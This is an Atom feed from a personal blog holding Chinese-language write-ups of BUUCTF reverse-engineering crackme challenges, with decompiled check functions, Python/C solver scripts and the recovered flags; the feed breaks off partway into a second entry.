<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://7usai.github.io</id>
    <title>7usai</title>
    <updated>2020-10-14T15:47:01.745Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://7usai.github.io"/>
    <link rel="self" href="https://7usai.github.io/atom.xml"/>
    <subtitle>7usai&apos;blog</subtitle>
    <logo>https://7usai.github.io/images/avatar.png</logo>
    <icon>https://7usai.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 7usai</rights>
    <entry>
        <title type="html"><![CDATA[BUUCTF re部分wp_3]]></title>
        <id>https://7usai.github.io/post/PxGlokR_W/</id>
        <link href="https://7usai.github.io/post/PxGlokR_W/">
        </link>
        <updated>2020-10-14T15:43:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="guet-ctf2019re">[GUET-CTF2019]re</h2>
<p>发现有upx壳，脱壳机脱壳失败，使用upx-d脱壳</p>
<p>找到主函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi
  int result; // eax
  __int64 v5; // rdx
  unsigned __int64 v6; // rt1
  __int64 v7; // [rsp+0h] [rbp-30h]
  __int64 v8; // [rsp+8h] [rbp-28h]
  __int64 v9; // [rsp+10h] [rbp-20h]
  __int64 v10; // [rsp+18h] [rbp-18h]
  unsigned __int64 v11; // [rsp+28h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  sub_40F950((unsigned __int64)&quot;input your flag:&quot;);
  sub_40FA80((unsigned __int64)&quot;%s&quot;);
  if ( (unsigned int)sub_4009AE((char *)&amp;v7) )
  {
    v3 = &quot;Correct!&quot;;
    sub_410350((__int64)&quot;Correct!&quot;);
  }
  else
  {
    v3 = &quot;Wrong!&quot;;
    sub_410350((__int64)&quot;Wrong!&quot;);
  }
  result = 0;
  v6 = __readfsqword(0x28u);
  v5 = v6 ^ v11;
  if ( v6 != v11 )
    sub_443550(v3, &amp;v7, v5);
  return result;
}
</code></pre>
<p>关键函数sub_4009AE</p>
<pre><code>_BOOL8 __fastcall sub_4009AE(char *a1)
{
  if ( 1629056 * *a1 != 166163712 )
    return 0LL;
  if ( 6771600 * a1[1] != 731332800 )
    return 0LL;
  if ( 3682944 * a1[2] != 357245568 )
    return 0LL;
  if ( 10431000 * a1[3] != 1074393000 )
    return 0LL;
  if ( 3977328 * a1[4] != 489211344 )
    return 0LL;
  if ( 5138336 * a1[5] != 518971936 )
    return 0LL;
  if ( 7532250 * a1[7] != 406741500 )
    return 0LL;
  if ( 5551632 * a1[8] != 294236496 )
    return 0LL;
  if ( 3409728 * a1[9] != 177305856 )
    return 0LL;
  if ( 13013670 * a1[10] != 650683500 )
    return 0LL;
  if ( 6088797 * a1[11] != 298351053 )
    return 0LL;
  if ( 7884663 * a1[12] != 386348487 )
    return 0LL;
  if ( 8944053 * a1[13] != 438258597 )
    return 0LL;
  if ( 5198490 * a1[14] != 249527520 )
    return 0LL;
  if ( 4544518 * a1[15] != 445362764 )
    return 0LL;
  if ( 3645600 * a1[17] != 174988800 )
    return 0LL;
  if ( 10115280 * a1[16] != 981182160 )
    return 0LL;
  if ( 9667504 * a1[18] != 493042704 )
    return 0LL;
  if ( 5364450 * a1[19] != 257493600 )
    return 0LL;
  if ( 13464540 * a1[20] != 767478780 )
    return 0LL;
  if ( 5488432 * a1[21] != 312840624 )
    return 0LL;
  if ( 14479500 * a1[22] != 1404511500 )
    return 0LL;
  if ( 6451830 * a1[23] != 316139670 )
    return 0LL;
  if ( 6252576 * a1[24] != 619005024 )
    return 0LL;
  if ( 7763364 * a1[25] != 372641472 )
    return 0LL;
  if ( 7327320 * a1[26] != 373693320 )
    return 0LL;
  if ( 8741520 * a1[27] != 498266640 )
    return 0LL;
  if ( 8871876 * a1[28] != 452465676 )
    return 0LL;
  if ( 4086720 * a1[29] != 208422720 )
    return 0LL;
  if ( 9374400 * a1[30] == 515592000 )
    return 5759124 * a1[31] == 719890500;
  return 0LL;
}
</code></pre>
<p>脚本</p>
<pre><code>a=[166163712,731332800,357245568,1074393000]
b=[1629056,6771600,3682944,10431000]
c=''
for i in range(len(a)):
    c+=chr(int(a[i]/b[i]))
print(c)

from z3 import *
s = Solver()
a1 = [0]*32
for i in range(32):
    a1[i] = Int('a1['+str(i)+']')

s.add( 1629056 * a1[0] == 166163712 )
s.add( 6771600 * a1[1] == 731332800 )
s.add( 3682944 * a1[2] == 357245568 )
s.add( 10431000 * a1[3] == 1074393000 )
s.add( 3977328 * a1[4] == 489211344 )
s.add( 5138336 * a1[5] == 518971936 )
s.add( 7532250 * a1[7] == 406741500 )
s.add( 5551632 * a1[8] == 294236496 )
s.add( 3409728 * a1[9] == 177305856 )
s.add( 13013670 * a1[10] == 650683500 )
s.add( 6088797 * a1[11] == 298351053 )
s.add( 7884663 * a1[12] == 386348487 )
s.add( 8944053 * a1[13] == 438258597 )
s.add( 5198490 * a1[14] == 249527520 )
s.add( 4544518 * a1[15] == 445362764 )
s.add( 3645600 * a1[17] == 174988800 )
s.add( 10115280 * a1[16] == 981182160 )
s.add( 9667504 * a1[18] == 493042704 )
s.add( 5364450 * a1[19] == 257493600 )
s.add( 13464540 * a1[20] == 767478780 )
s.add( 5488432 * a1[21] == 312840624 )
s.add( 14479500 * a1[22] == 1404511500 )
s.add( 6451830 * a1[23] == 316139670 )
s.add( 6252576 * a1[24] == 619005024 )
s.add( 7763364 * a1[25] == 372641472 )
s.add( 7327320 * a1[26] == 373693320 )
s.add( 8741520 * a1[27] == 498266640 )
s.add( 8871876 * a1[28] == 452465676 )
s.add( 4086720 * a1[29] == 208422720 )
s.add( 9374400 * a1[30] == 515592000 )
s.add(5759124 * a1[31] == 719890500)
s.check()
print(s.model())

a1=[0]*32
a1[31] = 125
a1[30] = 55
a1[29] = 51
a1[28] = 51
a1[27] = 57
a1[26] = 51
a1[25] = 48
a1[24] = 99
a1[23] = 49
a1[22] = 97
a1[21] = 57
a1[20] = 57
a1[19] = 48
a1[18] = 51
a1[16] = 97
a1[17] = 48
a1[15] = 98
a1[14] = 48
a1[13] = 49
a1[12] = 49
a1[11] = 49
a1[10] = 50
a1[9] = 52
a1[8] = 53
a1[7] = 54
a1[5] = 101
a1[4] = 123
a1[3] = 103
a1[2] = 97
a1[1] = 108
a1[0] = 102
d=''
for i in range(32):
    if i==6:
        continue
    d+=chr(a1[i])
    print(d)
</code></pre>
<p>先尝试前四位得到flag，猜测为flag，可以一个一个算，也可以省事使用z3，脚本如上，缺少a1[6]，一个一个试，从1到z，发现加个1就好</p>
<p>得flag=flag{e165421110ba03099a1c039337}</p>
<h2 id="flareon4login">[FlareOn4]login</h2>
<p>F12源代码</p>
<pre><code>&lt;!DOCTYPE Html /&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;FLARE On 2017&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;input type=&quot;text&quot; name=&quot;flag&quot; id=&quot;flag&quot; value=&quot;Enter the flag&quot; /&gt;
        &lt;input type=&quot;button&quot; id=&quot;prompt&quot; value=&quot;Click to check the flag&quot; /&gt;
        &lt;script type=&quot;text/javascript&quot;&gt;
            document.getElementById(&quot;prompt&quot;).onclick = function () {
                var flag = document.getElementById(&quot;flag&quot;).value;
                var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);});
//将(c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26)转为一个字符
charCodeAt() 方法可返回指定位置的字符的 Unicode 编码
b ? x : y b 操作数必须是一个布尔型的表达式，x 和 y 是任意类型的值。true,执行x
(c&lt;=&quot;Z&quot;执行Z否则z)&gt;=
                if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) {
                    alert(&quot;Correct flag!&quot;);
                } else {
                    alert(&quot;Incorrect flag, rot again&quot;);
                }
            }
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>分开大小写字母进行判断，相当于进行个13位移加密，直接凯撒密码就行</p>
<h2 id="actf新生赛2020rome">[ACTF新生赛2020]rome</h2>
<p>主函数</p>
<pre><code>int func()
{
  int result; // eax
  int v1; // [esp+14h] [ebp-44h]
  int v2; // [esp+18h] [ebp-40h]
  int v3; // [esp+1Ch] [ebp-3Ch]
  int v4; // [esp+20h] [ebp-38h]
  unsigned __int8 v5; // [esp+24h] [ebp-34h]
  unsigned __int8 v6; // [esp+25h] [ebp-33h]
  unsigned __int8 v7; // [esp+26h] [ebp-32h]
  unsigned __int8 v8; // [esp+27h] [ebp-31h]
  unsigned __int8 v9; // [esp+28h] [ebp-30h]
  int v10; // [esp+29h] [ebp-2Fh]
  int v11; // [esp+2Dh] [ebp-2Bh]
  int v12; // [esp+31h] [ebp-27h]
  int v13; // [esp+35h] [ebp-23h]
  unsigned __int8 v14; // [esp+39h] [ebp-1Fh]
  char v15; // [esp+3Bh] [ebp-1Dh]
  char v16; // [esp+3Ch] [ebp-1Ch]
  char v17; // [esp+3Dh] [ebp-1Bh]
  char v18; // [esp+3Eh] [ebp-1Ah]
  char v19; // [esp+3Fh] [ebp-19h]
  char v20; // [esp+40h] [ebp-18h]
  char v21; // [esp+41h] [ebp-17h]
  char v22; // [esp+42h] [ebp-16h]
  char v23; // [esp+43h] [ebp-15h]
  char v24; // [esp+44h] [ebp-14h]
  char v25; // [esp+45h] [ebp-13h]
  char v26; // [esp+46h] [ebp-12h]
  char v27; // [esp+47h] [ebp-11h]
  char v28; // [esp+48h] [ebp-10h]
  char v29; // [esp+49h] [ebp-Fh]
  char v30; // [esp+4Ah] [ebp-Eh]
  char v31; // [esp+4Bh] [ebp-Dh]
  int i; // [esp+4Ch] [ebp-Ch]

  v15 = 81;
  v16 = 115;
  v17 = 119;
  v18 = 51;
  v19 = 115;
  v20 = 106;
  v21 = 95;
  v22 = 108;
  v23 = 122;
  v24 = 52;
  v25 = 95;
  v26 = 85;
  v27 = 106;
  v28 = 119;
  v29 = 64;
  v30 = 108;
  v31 = 0;
  printf(&quot;Please input:&quot;);
  scanf(&quot;%s&quot;, &amp;v5);
  result = v5;
  if ( v5 == 'A' )
  {
    result = v6;
    if ( v6 == 'C' )
    {
      result = v7;
      if ( v7 == 'T' )
      {
        result = v8;
        if ( v8 == 'F' )
        {
          result = v9;
          if ( v9 == '{' )
          {
            result = v14;
            if ( v14 == '}' )                   // 中间一共16位字符
            {
              v1 = v10;
              v2 = v11;
              v3 = v12;
              v4 = v13;
              for ( i = 0; i &lt;= 15; ++i )
              {
                if ( *((_BYTE *)&amp;v1 + i) &gt; 64 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 90 )// v1[i]为大写字母
                  *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65;
                if ( *((_BYTE *)&amp;v1 + i) &gt; 96 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 122 )// v1[i]为小写字母
                  *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 79) % 26 + 97;
              }
              for ( i = 0; i &lt;= 15; ++i )
              {
                result = (unsigned __int8)*(&amp;v15 + i);
                if ( *((_BYTE *)&amp;v1 + i) != (_BYTE)result )
                  return result;
              }
              result = printf(&quot;You are correct!&quot;);
            }
          }
        }
      }
    }
  }
  return result;
}
</code></pre>
<p>脚本</p>
<pre><code>result=[81,115,119,51,115,106,95,108,122,52,95,85,106,119,64,108]
v1=''
for i in range(len(result)):
    for j in range(127):
        a=j
        if j&gt;64 and j&lt;=90:
            j=(j-51)%26+65
        if j&gt;96 and j&lt;=122:
            j=(j-79)%26+97
        if j==result[i]:
            v1+=chr(a)
print(v1)
</code></pre>
<h2 id="vn2020-公开赛strangecpp">[V&amp;N2020 公开赛]strangeCpp</h2>
<p>main函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  signed __int64 i; // rcx
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  char v10; // [rsp+0h] [rbp-20h]
  struct _SYSTEM_INFO SystemInfo; // [rsp+28h] [rbp+8h]
  __int64 *j; // [rsp+78h] [rbp+58h]
  __int64 v13; // [rsp+98h] [rbp+78h]
  const char **v14; // [rsp+1A0h] [rbp+180h]

  v14 = envp;
  v3 = &amp;v10;
  for ( i = 94i64; i; --i )
  {
    *v3 = -858993460;
    v3 += 4;
  }
  sub_1400110AA(&amp;unk_140027033);
  GetSystemInfo(&amp;SystemInfo);
  putchar(byte_140021004);
  putchar(byte_140021005);
  putchar(byte_140021006);
  putchar(byte_140021007);
  putchar(byte_140021019);
  putchar(byte_14002101A);
  putchar(byte_140021005);                      // welcome
  putchar(10);
  puts(&quot;Let me have a look at your computer...&quot;);
  for ( j = v14; *j; ++j )
  {
    v13 = *j;
    sub_140011226(&quot;%s\n&quot;, v13);
  }
  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_140011127);
  dword_140021190 = SystemInfo.dwNumberOfProcessors;
  sub_140011226(&quot;now system cpu num is %d\n&quot;, SystemInfo.dwNumberOfProcessors);
  if ( dword_140021190 &lt; 8 )
  {
    puts(&quot;Are you in VM?&quot;);
    _exit(0);
  }
  if ( GetUserNameA(Str1, &amp;pcbBuffer) )
  {
    v5 = sub_140011172(std::cout, &quot;this is useful&quot;);
    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140011127);
  }
  v6 = std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_140011127);
  v7 = sub_140011172(v6, &quot;ok,I am checking...&quot;);
  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v7, sub_140011127);
  if ( !j_strcmp(Str1, &quot;cxx&quot;) )
  {
    v8 = sub_140011172(std::cout, &quot;flag{where_is_my_true_flag?}&quot;);
    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v8, sub_140011127);
    _exit(0);
  }
  system(&quot;pause&quot;);
  sub_1400113E3(&amp;v10, &amp;unk_14001DE50);
  return 0;
}
</code></pre>
<p>在存储welcome的字符中间有一个奇怪的字符串byte_140021008</p>
<pre><code>.data:0000000140021004 byte_140021004  db 'w'                  ; DATA XREF: main+59↑r
.data:0000000140021005 byte_140021005  db 'e'                  ; DATA XREF: main+68↑r
.data:0000000140021005                                         ; main+B3↑r
.data:0000000140021006 byte_140021006  db 'l'                  ; DATA XREF: main+77↑r
.data:0000000140021007 byte_140021007  db 'c'                  ; DATA XREF: main+86↑r
.data:0000000140021008 ; _BYTE byte_140021008[17]
.data:0000000140021008 byte_140021008  db 26h, 2Ch, 21h, 27h, 3Bh, 0Dh, 4, 75h, 68h, 34h, 28h
.data:0000000140021008                                         ; DATA XREF: sub_140013580+81↑o
.data:0000000140021008                 db 25h, 0Eh, 35h, 2Dh, 69h, 3Dh
.data:0000000140021019 byte_140021019  db 'o'                  ; DATA XREF: main+95↑r
.data:000000014002101A byte_14002101A  db 'm'                  ; DATA XREF: main+A4↑r
</code></pre>
<p>交叉引用进入</p>
<pre><code>__int64 sub_140013580()
{
  __int64 *v0; // rdi
  signed __int64 i; // rcx
  __int64 result; // rax
  __int64 v3; // [rsp+0h] [rbp-20h]
  int v4; // [rsp+24h] [rbp+4h]
  int j; // [rsp+44h] [rbp+24h]
  __int64 v6; // [rsp+128h] [rbp+108h]

  v0 = &amp;v3;
  for ( i = 82i64; i; --i )
  {
    *v0 = -858993460;
    v0 = (v0 + 4);
  }
  v6 = -2i64;
  sub_1400110AA(&amp;unk_140027033);
  result = sub_140011384(dword_140021190);
  v4 = result;
  if ( result == 607052314 &amp;&amp; dword_140021190 &lt;= 14549743 )
  {
    for ( j = 0; j &lt; 17; ++j )
    {
      putchar((dword_140021190 ^ byte_140021008[j]));// 0x26,0x2C,0x21, 0x27, 0x3B, 0x0D, 0x04, 0x75, 0x68,0x34, 0x28, 0x25,0x0E, 0x35, 0x2D, 0x69,0x3D
      result = (j + 1);
    }
  }
  return result;
}
</code></pre>
<p>可知是找一个dword_140021190，经过sub_140011384函数变化放入result后result==607052314并且dword_140021190&lt;=14549743，逆向出这个dword_140021190后再与byte_140021008异或后输出</p>
<p>脚本</p>
<pre><code>v7=0
for i in range(14549743):
    tmp=(((i&lt;&lt;8)^(i&gt;&gt;12))*291)&amp;0xffffffff#unsigned int 范围是0~0xFFFFFFFF
    if tmp==607052314:
        v7=i
        break
print(v7)
#爆破出v7值

flag=''
byte_140021008=[0x26,0x2C,0x21, 0x27, 0x3B, 0x0D, 0x04, 0x75, 0x68,0x34, 0x28, 0x25,0x0E, 0x35, 0x2D, 0x69,0x3D]
for i in range(len(byte_140021008)):
    flag+=chr((byte_140021008[i]^v7)&amp;0xFF)
    print(flag)

import hashlib
md = hashlib.md5()
md.update(str(v7).encode('utf-8'))
print (&quot;flag{&quot;+md.hexdigest()+&quot;}&quot;)
</code></pre>
<h2 id="bjdctf2020easy">[BJDCTF2020]easy</h2>
<p>关键函数</p>
<pre><code>int ques()
{
  int v0; // edx
  int result; // eax
  int v2[50]; // [esp+20h] [ebp-128h]
  int v3; // [esp+E8h] [ebp-60h]
  int v4; // [esp+ECh] [ebp-5Ch]
  int v5; // [esp+F0h] [ebp-58h]
  int v6; // [esp+F4h] [ebp-54h]
  int v7; // [esp+F8h] [ebp-50h]
  int v8; // [esp+FCh] [ebp-4Ch]
  int v9; // [esp+100h] [ebp-48h]
  int v10; // [esp+104h] [ebp-44h]
  int v11; // [esp+108h] [ebp-40h]
  int v12; // [esp+10Ch] [ebp-3Ch]
  int j; // [esp+114h] [ebp-34h]
  __int64 v14; // [esp+118h] [ebp-30h]
  int v15; // [esp+124h] [ebp-24h]
  int v16; // [esp+128h] [ebp-20h]
  int i; // [esp+12Ch] [ebp-1Ch]

  v3 = 0x7FFA7E31;
  v4 = 0x224FC;
  v5 = 0x884A4239;
  v6 = 0x22A84;
  v7 = 0x84FF235;
  v8 = 0x3FF87;
  v9 = 0x88424233;
  v10 = 0x23185;
  v11 = 0x7E4243F1;
  v12 = 0x231FC;
  for ( i = 0; i &lt;= 4; ++i )
  {
    memset(v2, 0, sizeof(v2));
    v16 = 0;
    v15 = 0;
    v0 = *(&amp;v4 + 2 * i);
    LODWORD(v14) = *(&amp;v3 + 2 * i);              // 取出无符号长整型参数的高16位。v3[2i]
    HIDWORD(v14) = v0;                          // 取出无符号长整型参数的低16位。v4[2i]
    while ( SHIDWORD(v14) &gt; 0 || v14 &gt;= 0 &amp;&amp; v14 )
    {
      v2[v16++] = ((SHIDWORD(v14) &gt;&gt; 31) ^ (((SHIDWORD(v14) &gt;&gt; 31) ^ v14) - (SHIDWORD(v14) &gt;&gt; 31)) &amp; 1)
                - (SHIDWORD(v14) &gt;&gt; 31);
      v14 /= 2LL;
    }
    for ( j = 50; j &gt;= 0; --j )
    {
      if ( v2[j] )
      {
        if ( v2[j] == 1 )
        {
          putchar('*');
          ++v15;
        }
      }
      else
      {
        putchar(' ');
        ++v15;
      }
      if ( !(v15 % 5) )
        putchar(' ');
    }
    result = putchar('\n');
  }
  return result;
}
</code></pre>
<p>大致意思是将v3~v12这十个数转为二进制后以两两为一组最后形成5个50位的数后比较，得出是打印&quot;*&quot;还是打印&quot; &quot;</p>
<p>脚本</p>
<pre><code>#include&lt;iostream&gt;
#include&lt;cstring&gt;
using namespace std;
int main()
{
	char a[5][50]={
	1,0,0,0,1,0,0,1,0,0,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,0,1,1,1,1,1,1,0,0,0,1,1,0,0,0,1,
	1,0,0,0,1,0,1,0,1,0,1,0,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,1,0,1,0,0,1,0,0,0,0,1,0,0,0,1,1,1,0,0,1,
	1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,1,1,0,0,0,0,1,0,0,0,0,1,0,0,1,1,1,1,1,1,1,1,0,0,1,0,0,0,1,1,0,1,0,1,
	1,0,0,0,1,1,0,0,0,1,1,0,0,0,0,1,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,1,1,0,0,1,1,
	1,0,0,0,1,1,0,0,0,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,0,0,1,0,0,0,0,1,0,0,1,0,0,0,0,1,1,1,1,1,1,0,0,0,1};
	int v15=0;
	for(int i=0;i&lt;5;i++)
	{
	for(int j=0;j&lt;50;j++)
	{
		if(a[i][j]==1)
		{
		cout&lt;&lt;&quot;*&quot;;
		++v15;
		}
		else
		{
		cout&lt;&lt;&quot; &quot;;
		++v15;
	}
		if(!(v15%5))
		cout&lt;&lt;&quot; &quot;;
	}
	cout&lt;&lt;endl;
}
 } 

</code></pre>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1602690295809.png" alt="" loading="lazy"></figure>
<h2 id="vn2020-公开赛csre">[V&amp;N2020 公开赛]CSRe</h2>
<p>de4dot .\CSRe.exe脱壳，放入dnspy</p>
<p>主函数</p>
<pre><code>// Class3
// Token: 0x0600000F RID: 15 RVA: 0x00002374 File Offset: 0x00000574
private static void Main(string[] args)
{
	if (!Class1.smethod_1())
	{
		return;
	}
	bool flag = true;
	Class3 @class = new Class3();
	string str = Console.ReadLine();
	if (Class3.smethod_0(&quot;3&quot; + str + &quot;9&quot;) != &quot;B498BFA2498E21325D1178417BEA459EB2CD28F8&quot;)
	{
		flag = false;
	}
	string text = Console.ReadLine();
	string string_ = Class3.smethod_0(&quot;re&quot; + text);
	string text2 = @class.method_0(string_, &quot;63143B6F8007B98C53CA2149822777B3566F9241&quot;);
	for (int i = 0; i &lt; text2.Length; i++)
	{
		if (text2[i] != '0')
		{
			flag = false;
		}
	}
	if (flag)
	{
		Console.WriteLine(&quot;flag{&quot; + str + text + &quot;}&quot;);
	}
}
</code></pre>
<p>大致意思是flag中是由str和text组成的，3+str+9经过smethod_0加密后为一个已知字符串，re+text加密后同理</p>
<p>进入smethod_0函数</p>
<pre><code>	public static string smethod_0(string string_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_0);
		byte[] array = SHA1.Create().ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString(&quot;X2&quot;));
		}
		return stringBuilder.ToString();
	}
</code></pre>
<p>为一个sha1加密函数，在线解密后得flag</p>
<h2 id="actf新生赛2020usualcrypt">[ACTF新生赛2020]usualCrypt</h2>
<p>主函数</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // esi
  int result; // eax
  int v5; // [esp+8h] [ebp-74h]
  int v6; // [esp+Ch] [ebp-70h]
  int v7; // [esp+10h] [ebp-6Ch]
  __int16 v8; // [esp+14h] [ebp-68h]
  char v9; // [esp+16h] [ebp-66h]
  char v10; // [esp+18h] [ebp-64h]

  sub_403CF8(&amp;dword_40E140);                    // 来来来give your flag
  scanf(aS, &amp;v10);                              // %s 输入字符串存入v10所在位置
  v5 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  sub_401080(&amp;v10, strlen(&amp;v10), &amp;v5);
  v3 = 0;
  while ( *(&amp;v5 + v3) == byte_40E0E4[v3] )      // v5[i]==byte_40E0E4[i]  v5为36位
  {
    if ( ++v3 &gt; strlen(&amp;v5) )
      goto LABEL_6;                             // 循环完后 goto LABEL_6
  }
  sub_403CF8(aError);
LABEL_6:
  if ( v3 - 1 == strlen(byte_40E0E4) )          // v5字符串长度和byte_40E0E4字符串长度一致
    result = sub_403CF8(aAreYouHappyYes);       // right
  else
    result = sub_403CF8(aAreYouHappyNo);
  return result;
}
</code></pre>
<p>从主函数可知加密函数位sub_401080，进入后发现是一个base64加密函数<br>
并提出来byte_40E0E4=zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</p>
<p>base64加密函数</p>
<pre><code>// base64加密
int __cdecl sub_401080(int a1, int a2, int a3)
{
  int v3; // edi
  int v4; // esi
  int v5; // edx
  int v6; // eax
  int v7; // ecx
  int v8; // esi
  int v9; // esi
  int v10; // esi
  int v11; // esi
  _BYTE *v12; // ecx
  int v13; // esi
  int v15; // [esp+18h] [ebp+8h]

  v3 = 0;
  v4 = 0;
  sub_401000();                                 // len(v10)=36
  v5 = a2 % 3;                                  // v5=len(v10)%3
  v6 = a1;                                      // v6=v10
  v7 = a2 - a2 % 3;                             // v7=len(v10)-len(v10)%3
  v15 = a2 % 3;                                 // v15=len(v10)%3
  if ( v7 &gt; 0 )
  {
    do
    {
      LOBYTE(v5) = *(a1 + v3);
      v3 += 3;
      v8 = v4 + 1;
      *(v8++ + a3 - 1) = byte_40E0A0[(v5 &gt;&gt; 2) &amp; 0x3F];// a3=main_v5  a3[0]=
      *(v8++ + a3 - 1) = byte_40E0A0[16 * (*(a1 + v3 - 3) &amp; 3) + ((*(a1 + v3 - 2) &gt;&gt; 4) &amp; 0xF)];// a3[1]=
      *(v8 + a3 - 1) = byte_40E0A0[4 * (*(a1 + v3 - 2) &amp; 0xF) + ((*(a1 + v3 - 1) &gt;&gt; 6) &amp; 3)];// a3[2]=
      v5 = *(a1 + v3 - 1) &amp; 0x3F;
      v4 = v8 + 1;
      *(v4 + a3 - 1) = byte_40E0A0[v5];
    }
    while ( v3 &lt; v7 );
    v5 = v15;
  }
  if ( v5 == 1 )
  {
    LOBYTE(v7) = *(v3 + a1);
    v9 = v4 + 1;
    *(v9 + a3 - 1) = byte_40E0A0[(v7 &gt;&gt; 2) &amp; 0x3F];
    v10 = v9 + 1;
    *(v10 + a3 - 1) = byte_40E0A0[16 * (*(v3 + a1) &amp; 3)];
    *(v10 + a3) = 61;
LABEL_8:
    v13 = v10 + 1;
    *(v13 + a3) = 61;
    v4 = v13 + 1;
    goto LABEL_9;
  }
  if ( v5 == 2 )
  {
    v11 = v4 + 1;
    *(v11 + a3 - 1) = byte_40E0A0[(*(v3 + a1) &gt;&gt; 2) &amp; 0x3F];
    v12 = (v3 + a1 + 1);
    LOBYTE(v6) = *v12;
    v10 = v11 + 1;
    *(v10 + a3 - 1) = byte_40E0A0[16 * (*(v3 + a1) &amp; 3) + ((v6 &gt;&gt; 4) &amp; 0xF)];
    *(v10 + a3) = byte_40E0A0[4 * (*v12 &amp; 0xF)];
    goto LABEL_8;
  }
LABEL_9:
  *(v4 + a3) = 0;
  return sub_401030(a3);                        // 大小写转化函数
}
</code></pre>
<p>在这个加密函数中调用了两个函数sub_401000和sub_401030，其中后者为大小写转化函数，过于简单，不分析</p>
<p>sub_401000</p>
<pre><code>signed int sub_401000()
{
  signed int result; // eax
  char v1; // cl

  result = 6;
  do
  {
    v1 = byte_40E0AA[result];
    byte_40E0AA[result] = byte_40E0A0[result];
    byte_40E0A0[result++] = v1;
  }
  while ( result &lt; 15 );
  return result;
}
</code></pre>
<p>易知byte_40E0A0=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>
byte_40E0AA=KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>
这里相当于从两个byte数组下标为6的地方开始到下标为14的地方结束，进行互换，互换后的结果为此时的byte_40E0A0<br>
我们需要得到互换之前的base64对照表</p>
<p>大致意思是flag经过之前的base64对照表转换，再经过大小写转换得到byte_40E0E4=zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</p>
<h3 id="脚本思路">脚本思路</h3>
<p>先对byte_40E0E4进行大小写转换，再获得之前的base64对照表，再通过对照表将新的byte_40E0E4转换为flag的base64值，再解密base64</p>
<p>脚本</p>
<pre><code>import base64
flag = ''; dict = {};
orgin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
for i in range(len(orgin)):
    dict[orgin[i]] = orgin[i]
for i in range(6, 15): 
    dict[orgin[i]] , dict[orgin[i+10]] = dict[orgin[i+10]] , dict[orgin[i]] # 恢复base64密钥表
print(dict)
secret = 'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'.swapcase() #sub_401030()大小写转换
for i in range(len(secret)):
    flag += dict[secret[i]]#根据恢复后的base64密钥表进行部分字符转化，想到于G~O的字符转为Q~Y,Q~Y转为G~o
print(flag)
flag = base64.b64decode(flag)
print(flag)

#恢复base64密钥表相当于以下算法
secret1 = 'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'.swapcase()
a=''
for i in range(len(secret1)):
    if ord(secret1[i])&lt;80 and ord(secret1[i])&gt;=71:
        a += chr(ord(secret1[i]) + 10)
    else:
        if ord(secret1[i])&lt;90 and ord(secret1[i])&gt;=81:
            a += chr(ord(secret1[i]) - 10)
        else:
            a += chr(ord(secret1[i]))
print(a)
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUCTF re部分wp_2]]></title>
        <id>https://7usai.github.io/post/jU8l_PwBM/</id>
        <link href="https://7usai.github.io/post/jU8l_PwBM/">
        </link>
        <updated>2020-10-10T15:41:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="gwctf-2019pyre">[GWCTF 2019]pyre</h2>
<h3 id="脚本">脚本</h3>
<pre><code>flag=''
code = [
    '\x1f',
    '\x12',
